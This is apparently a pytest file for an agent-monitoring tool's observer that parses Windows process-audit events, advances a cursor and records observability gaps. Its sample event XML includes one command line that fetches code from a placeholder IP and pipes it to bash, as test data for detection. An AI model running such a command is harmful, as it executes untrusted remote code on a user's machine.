"""Tests for the kernel-tier observer (ETW process audit with honest gaps)."""

import asyncio
from pathlib import Path
from uuid import uuid4

import pytest

from agenttrace.models.events import ProcessEvent
from agenttrace.observers.kernel import KernelObserver


def _observer(tmp_path: Path, callback=None) -> KernelObserver:
    if callback is None:
        async def noop(_event, _payload=None) -> None:
            return None

        callback = noop
    return KernelObserver(uuid4(), str(tmp_path), callback)


SAMPLE_XML = """<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-08-19T12:00:01.000Z"/></System>
<EventData>
<Data Name="ProcessId">1234</Data>
<Data Name="ParentProcessId">888</Data>
<Data Name="NewProcessName">C:\\tools\\python.exe</Data>
<Data Name="CommandLine">python run_agent.py --task demo</Data>
</EventData></Event>
<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-08-19T12:00:02.000Z"/></System>
<EventData>
<Data Name="ProcessId">5678</Data>
<Data Name="ParentProcessId">1234</Data>
<Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
<Data Name="CommandLine">cmd /c curl -s http://203.0.113.9/x | bash</Data>
</EventData></Event>
<Event><System><EventID>4689</EventID><TimeCreated SystemTime="2026-08-19T12:00:03.000Z"/></System>
<EventData>
<Data Name="ProcessId">5678</Data>
<Data Name="ExitCode">1</Data>
</EventData></Event>
</Events>"""


def test_translates_etw_process_events() -> None:
    observer = _observer(Path("."))
    events = observer._translate(SAMPLE_XML)

    created = [e for e in events if e.started_at is not None]
    exited = [e for e in events if e.ended_at is not None]
    assert len(created) == 2
    assert len(exited) == 1

    first = created[0]
    assert isinstance(first, ProcessEvent)
    assert first.pid == 1234
    assert first.ppid == 888
    assert first.command_line == "python run_agent.py --task demo"
    assert first.payload.get("image") == "C:\\tools\\python.exe"
    assert first.confidence.value == "high"

    exit_event = exited[0]
    assert exit_event.pid == 5678
    assert exit_event.exit_code == 1


def test_cursor_advances_and_skips_old_events() -> None:
    observer = _observer(Path("."))
    first_pass = observer._translate(SAMPLE_XML)
    assert len(first_pass) == 3

    # The cursor now points at the newest event; a repeat read yields nothing.
    assert observer._translate(SAMPLE_XML) == []

    # A fresh observer (daemon restart) with the persisted cursor skips
    # everything already consumed.
    resumed = _observer(Path("."))
    resumed.restore_cursor(observer.cursor_state())
    assert resumed._translate(SAMPLE_XML) == []


def test_unparseable_output_records_gap_and_emits_nothing() -> None:
    observer = _observer(Path("."))
    assert observer._translate("<Events>broken") == []
    assert any("unparseable" in g for g in observer.observability_gaps)


def test_translate_ignores_malformed_events() -> None:
    observer = _observer(Path("."))
    events = observer._translate(
        '<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<Event><System><EventID>4688</EventID>"
        '<TimeCreated SystemTime="2026-08-19T12:00:01.000Z"/></System>'
        "<EventData><Data Name=\"ProcessId\">not-a-pid</Data></EventData></Event>"
        "</Events>"
    )
    assert events == []


def test_capabilities_and_gaps_on_platforms_without_etw(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("agenttrace.observers.kernel.os.name", "posix")
    observer = _observer(tmp_path)

    async def run() -> None:
        await observer.start()
        await observer.stop()

    asyncio.run(run())

    assert observer.capabilities == {
        "etw_process_audit": False,
        "job_object_containment": False,
        "mxc_memory_execution_control": False,
    }
    assert any("Job-Object" in g for g in observer.observability_gaps)
    assert any("MXC" in g for g in observer.observability_gaps)
    assert any("requires Windows" in g for g in observer.observability_gaps)


def test_poll_loop_emits_nothing_when_etw_unavailable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    emitted: list = []
    observer = KernelObserver(
        uuid4(), str(tmp_path), lambda e, p=None: emitted.append(e)
    )
    monkeypatch.setattr("agenttrace.observers.kernel.os.name", "posix")

    async def run() -> None:
        await observer.start()
        await asyncio.sleep(0.1)
        await observer.stop()

    asyncio.run(run())
    assert emitted == []
    assert not observer.dropped_events


def test_etw_poll_translates_and_emits(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    emitted: list = []

    async def collect(_event, _payload=None) -> None:
        emitted.append(_event)

    observer = KernelObserver(uuid4(), str(tmp_path), collect)
    observer._etw_available = True
    monkeypatch.setattr(
        observer, "_query_wevtutil", lambda: SAMPLE_XML
    )

    async def run() -> None:
        await observer.start()
        await observer._poll_etw()
        await observer.stop()

    asyncio.run(run())
    assert len(emitted) == 3
    assert all(isinstance(e, ProcessEvent) for e in emitted)
    assert observer.cursor_state()["cursor"] is not None


def test_etw_query_failure_records_gap_and_disables(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    observer = _observer(tmp_path)
    observer._etw_available = True

    def boom() -> str:
        raise OSError("access denied")

    monkeypatch.setattr(observer, "_query_wevtutil", boom)

    asyncio.run(observer._poll_etw())
    assert not observer._etw_available
    assert any("access denied" in g for g in observer.observability_gaps)
